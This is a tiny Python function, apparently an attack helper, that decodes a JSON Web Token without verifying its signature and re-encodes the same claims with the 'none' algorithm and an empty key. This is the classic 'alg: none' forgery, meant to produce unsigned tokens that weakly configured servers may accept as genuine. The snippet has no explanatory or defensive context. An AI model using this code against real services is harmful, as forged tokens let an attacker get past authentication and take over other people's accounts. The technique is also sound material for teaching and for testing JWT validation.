import jwt

def change_to_none(token):
    decoded = jwt.decode(token, verify=False)
    return jwt.encode(decoded, '', algorithm='none')